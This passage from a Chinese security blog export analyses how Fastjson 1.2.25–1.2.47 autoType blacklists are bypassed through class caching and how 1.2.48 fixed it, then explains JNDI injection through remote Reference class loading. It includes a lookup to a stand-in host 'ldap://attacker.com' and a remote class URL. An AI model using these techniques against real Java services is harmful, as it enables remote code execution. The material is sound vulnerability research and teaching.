<h1 id="关于AutoTypeSupport"><a href="#关于AutoTypeSupport" class="headerlink" title="关于AutoTypeSupport"></a>关于AutoTypeSupport</h1><p>可以看到实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
<ul>
<li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li>
<li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li>
</ul>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="受AutoTypeSupport影响的版本"><a href="#受AutoTypeSupport影响的版本" class="headerlink" title="受AutoTypeSupport影响的版本"></a>受AutoTypeSupport影响的版本</h3><p>受AutoTypeSupport影响的版本为1.2.25-1.2.32，本次调试的是1.2.25版本。</p>
<h4 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>发现报错：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706204309011.png" alt="image-20200706204309011"></p>
<p>调试发现，在第一部分JSON数据的解析中，checkAutoType()函数的处理过程和前面是差不多的。能够成功通过该函数的检测，因此问题不在这，继续往下调试。</p>
<p>在第二部分JSON数据的解析中，@type指向的”com.sun.rowset.JdbcRowSetImpl”在checkAutoType()函数中会被dentList黑名单中的”com.sun.”匹配到，因此会直接报错显示不支持：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706205306004.png" alt="image-20200706205306004"></p>
<h4 id="未开启AutoTypeSupport时"><a href="#未开启AutoTypeSupport时" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>当不开启AutoTypeSupport时就不会进入该黑白名单校验的代码逻辑中，就不会被过滤报错。</p>
<p>这里，我们换个不受AutoTypeSupport影响的且未使用哈希黑名单的版本来方便我们进行对比查看，这里选了1.2.33，看下checkAutoType()中对应的代码：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706211622134.png" alt="image-20200706211622134"></p>
<p>对比黑名单校验的if判断语句条件就知道了，为什么后面的版本不受影响，那是因为通过<code>&amp;&amp;</code>多添加了一个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，但是第二部分JSON内容中的类已经通过第一部分解析的时候加载到Map中缓存了，因此该条件不成立从而成功绕过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不受AutoTypeSupport影响的版本</span></span><br><span class="line"><span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>

<h3 id="不受AutoTypeSupport影响的版本"><a href="#不受AutoTypeSupport影响的版本" class="headerlink" title="不受AutoTypeSupport影响的版本"></a>不受AutoTypeSupport影响的版本</h3><p>不受AutoTypeSupport影响的版本为1.2.33-1.2.47，本次调试的是1.2.47版本。</p>
<h4 id="未开启AutoTypeSupport时-1"><a href="#未开启AutoTypeSupport时-1" class="headerlink" title="未开启AutoTypeSupport时"></a>未开启AutoTypeSupport时</h4><p>在调用DefaultJSONParser.parserObject()函数时，其会对JSON数据进行循环遍历扫描解析。</p>
<p>在第一次扫描解析中，进行checkAutoType()函数，由于未开启AutoTypeSupport，因此不会进入黑白名单校验的逻辑；由于@type执行java.lang.Class类，该类在接下来的findClass()函数中直接被找到，并在后面的if判断clazz不为空后直接返回：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212531680.png" alt="image-20200706212531680"></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212622129.png" alt="image-20200706212622129"></p>
<p>往下调试，调用到MiscCodec.deserialze()，其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212816333.png" alt="image-20200706212816333"></p>
<p>接着判断clazz是否为Class类，是的话调用TypeUtils.loadClass()加载strVal变量值指向的类：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706212914209.png" alt="image-20200706212914209"></p>
<p>在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/5.png" alt="img"></p>
<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/6-20200706213237782.png" alt="img"></p>
<h4 id="开启AutoTypeSupport"><a href="#开启AutoTypeSupport" class="headerlink" title="开启AutoTypeSupport"></a>开启AutoTypeSupport</h4><p>由前面知道，开启AutoTypeSupport后，在checkAutoType()函数中会进入黑白名单校验的代码逻辑。</p>
<p>在第一部分JSON数据的扫描解析中，由于@type指向java.lang.Class，因此即使是开启AutoTypeSupport先后进行白名单、黑名单校验的情况下都能成功通过检测，之后和前面的一样调用findClass()函数获取到Class类：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/7.png" alt="img"></p>
<p>关键在于第二部分JSON数据的扫描解析。第二部分的@type指向的是利用类”com.sun.rowset.JdbcRowSetImpl”，其中的”com.sun.”是在denyList黑名单中的，但是为何在检测时能成功绕过呢？</p>
<p>我们调试发现，逻辑是先进行白名单再进行黑名单校验，在黑名单校验的if判断条件中是存在两个必须同时满足的条件的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>第一个判断条件<code>Arrays.binarySearch(denyHashCodes, hash) &gt;= 0</code>是满足的，因为我们的@type包含了黑名单的内容；关键在于第二个判断条件<code>TypeUtils.getClassFromMapping(typeName) == null</code>，这里由于前面已经将com.sun.rowset.JdbcRowSetImpl类缓存在Map中了，也就是说该条件并不满足，导致能够成功绕过黑名单校验、成功触发漏洞。</p>
<h1 id="1-2-48-修复"><a href="#1-2-48-修复" class="headerlink" title="1.2.48 修复"></a>1.2.48 修复</h1><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。</p>
<p>运行会报错：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">"main"</span> com.alibaba.fastjson.JSONException: autoType is not support. com.sun.rowset.JdbcRowSetImpl</span><br></pre></td></tr></table></figure>

<p>调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
<p>对比代码。修改了cache这一处。（右侧为1.2.47代码）</p>
<p>本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。</p>
<p>现在这边直接指定过来三个参数loadClass同时cache为false。</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-705c34bc-2d01-1.jpg" alt="img"></p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-707ccdbc-2d01-1.jpg" alt="img"></p>
<p>对于之前提到了第三处mapping不需要校验，1.2.48也不行了：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094439-70b6cd8c-2d01-1.jpg" alt="img"></p>
<p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/12.png" alt="img"></p>
<h1 id="1-2-48之后"><a href="#1-2-48之后" class="headerlink" title="1.2.48之后"></a>1.2.48之后</h1><p>在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。</p>
<p>参考：</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">mi1k7ea</a></p>
<p><a href="https://xz.aliyun.com/t/7027#toc-18" target="_blank" rel="noopener">lalajun</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>搞懂JNDI</title>
    <url>/%E6%90%9E%E6%87%82JNDI/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>莫听穿林打叶声，何妨吟啸且徐行。</p>
</blockquote>
<p>前几天在搞RMI，发现攻击方式经常结合JNDI注入一起玩，这篇直接先来总结JNDI</p>
<a id="more"></a>

<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。</p>
<p>JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。</p>
<p>简单点说，JNDI就是一组API接口。<strong>每一个对象都有一组唯一的键值绑定，将名字和对象绑定</strong>，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。</p>
<p>Java Naming and Directory Interface(JNDI)是一种Java API，可以通过名称来发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，如远程方法调用(RMI)、公共对象请求代理体系结构(CORBA)、轻量级目录访问协议(LDAP)或域名服务(DNS)。</p>
<p>换句话说，JNDI就是一个简单的Java API（如“InitialContext.Lookup（String Name）”），它只接受一个字符串参数，如果该参数来自不可信的源的话，则可能因为远程类加载而引发远程代码执行攻击。</p>
<p>当被请求对象的名称处于攻击者掌控之下时，他们就能将受害Java应用程序指向恶意的RMI/LDAP/CORBA服务器，并使用任意对象进行响应。如果该对象是“javax.naming.Reference”类的实例，那么，JNDI客户端将尝试解析该对象的“classFactory”和“classFactoryLocation”属性。如果目标Java应用程序不知道“ClassFactory”的值，Java将使用Java的URLClassLoader从“ClassFactoryLocation”处获取该工厂的字节码。</p>
<p>由于其简单性，即使“InitialContext.lookup”方法没有直接暴露给受污染的数据，它对于利用Java漏洞来说也非常有用。在某些情况下，仍然可以通过反序列化或不安全的反射攻击来访问它。</p>
<p>如图：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/1.png" alt="img"></p>
<h2 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h2><p>命名服务是一种键值对的绑定，使应用程序可以通过键检索值。</p>
<h2 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h2><p>目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。</p>
<p>JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。</p>
<h2 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h2><p>Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。</p>
<p>JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。</p>
<h1 id="JNDI代码示例"><a href="#JNDI代码示例" class="headerlink" title="JNDI代码示例"></a>JNDI代码示例</h1><p>在JNDI中提供了绑定和查找的方法：</p>
<ul>
<li>bind：将名称绑定到对象中；</li>
<li>lookup：通过名字检索执行的对象；</li>
</ul>
<p>这两个操作都是用的InitialContext类对象来调用。多说无益，直接上代码：</p>
<p>下面是基本用法Demo，以RMI服务为例。</p>
<p>先定义一个Person类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span>+name+<span class="string">" password:"</span>+password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是Server端，Server.java，其实是将服务端和客户端的代码写在一起了，分为两个部分。第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索Person对象并输出出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化person对象</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        p.setPassword(<span class="string">"Niubility!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person。</span></span><br><span class="line">        ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">findPerson</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用再绑定了</span></span><br><span class="line">        InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过lookup查找person对象</span></span><br><span class="line">        Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印出这个对象</span></span><br><span class="line">        System.out.println(person.toString());</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        initPerson();</span><br><span class="line">        findPerson();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200629191702347.png" alt="image-20200629191702347"></p>
<h2 id="纯RMI与JNDI的对比"><a href="#纯RMI与JNDI的对比" class="headerlink" title="纯RMI与JNDI的对比"></a>纯RMI与JNDI的对比</h2><p>我们可以简单比较一下纯RMI写法和使用JNDI检索的写法，在纯RMI写法中的两种典型写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> remote.IRemoteMath;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//服务端</span></span><br><span class="line">    IRemoteMath remoteMath = <span class="keyword">new</span> RemoteMath();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">1099</span>);    </span><br><span class="line">    Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">    registry.bind(<span class="string">"Compute"</span>, remoteMath);</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//客户端</span></span><br><span class="line">    Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>);        </span><br><span class="line">    IRemoteMath remoteMath = (IRemoteMath)registry.lookup(<span class="string">"Compute"</span>);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">    PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">    LocateRegistry.createRegistry(<span class="number">6600</span>);</span><br><span class="line">    Naming.rebind(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>, personService);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端</span></span><br><span class="line">	PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>);</span><br></pre></td></tr></table></figure>

<p>而JNDI中相关代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">	LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">	...</span><br><span class="line">    ctx.bind(<span class="string">"person"</span>, p);</span><br><span class="line">    ctx.close();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端</span></span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">    Person person = (Person) ctx.lookup(<span class="string">"person"</span>);</span><br><span class="line">	ctx.close();</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务端</span></span><br><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure>

<p>相比之下：</p>
<ul>
<li>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中；</li>
<li>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的；</li>
</ul>
<p>简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用Java Naming来实现的。</p>
<h1 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h1><p>Reference类表示对存在于命名/目录系统以外的对象的引用。</p>
<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
<p>在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。</p>
<p>几个比较关键的属性：</p>
<ul>
<li>className：远程加载时所使用的类名；</li>
<li>classFactory：加载的class中需要实例化类的名称；</li>
<li>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li>
</ul>
<p>例如这里定义一个 <code>Reference</code> 实例，并使用继承了 <code>UnicastRemoteObject</code> 类的 <code>ReferenceWrapper</code> 包裹一下实例对象，使其能够通过 <code>RMI</code> 进行远程访问：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"refClassName"</span>, <span class="string">"insClassName"</span>, <span class="string">"http://example.com:12345/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>

<p>当有客户端通过 <code>lookup(&quot;refObj&quot;)</code> 获取远程对象时，获得到一个 <code>Reference</code> 类的存根，由于获取的是一个 <code>Reference</code> 实例，客户端会首先去本地的 <code>CLASSPATH</code> 去寻找被标识为 <code>refClassName</code> 的类，如果本地未找到，则会去请求 <code>http://example.com:12345/refClassName.class</code> 动态加载 <code>classes</code> 并调用 <code>insClassName</code> 的构造函数。</p>
<h1 id="远程代码和安全管理器"><a href="#远程代码和安全管理器" class="headerlink" title="远程代码和安全管理器"></a>远程代码和安全管理器</h1><h2 id="Java中的安全管理器"><a href="#Java中的安全管理器" class="headerlink" title="Java中的安全管理器"></a>Java中的安全管理器</h2><p>Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200629203820570.png" alt="image-20200629203820570"></p>
<p>JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。</p>
<h2 id="JNDI的安全管理器"><a href="#JNDI的安全管理器" class="headerlink" title="JNDI的安全管理器"></a>JNDI的安全管理器</h2><p>对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：</p>
<p><img src="../images/%E6%90%9E%E6%87%82JNDI/image-20200629203916955.png" alt="image-20200629203916955"></p>
<p>针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。</p>
<h2 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h2><p>举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">    env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">            <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    env.put(Context.PROVIDER_URL,</span><br><span class="line">            <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">    Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">	LocateRegistry.createRegistry(<span class="number">6666</span>);</span><br><span class="line">    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">    System.setProperty(Context.PROVIDER_URL, <span class="string">"rmi://localhost:6666"</span>);</span><br><span class="line">    InitialContext ctx = <span class="keyword">new</span> InitialContext();</span><br></pre></td></tr></table></figure>

<p>但在调用lookup()或者search()时，可以使用带URI动态的转换上下文环境，例如上面已经设置了当前上下文会访问RMI服务，那么可以直接使用LDAP的URI格式去转换上下文环境访问LDAP服务上的绑定对象而非原本的RMI服务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ctx.lookup(<span class="string">"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com"</span>);</span><br></pre></td></tr></table></figure>

<p>其原理可以跟踪代码找到：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进去就知道了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Context <span class="title">getURLOrDefaultInitCtx</span><span class="params">(Name paramName)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultInitCtx(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (paramName.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        String str1 = paramName.get(<span class="number">0</span>);</span><br><span class="line">        String str2 = getURLScheme(str1);  <span class="comment">// 尝试解析 URI 中的协议</span></span><br><span class="line">        <span class="keyword">if</span> (str2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果存在 Schema 协议，则尝试获取其对应的上下文环境</span></span><br><span class="line">            Context localContext = NamingManager.getURLContext(str2, <span class="keyword">this</span>.myProps);</span><br><span class="line">            <span class="keyword">if</span> (localContext != <span class="keyword">null</span>) &#123; </span><br><span class="line">                <span class="keyword">return</span> localContext;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> getDefaultInitCtx();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

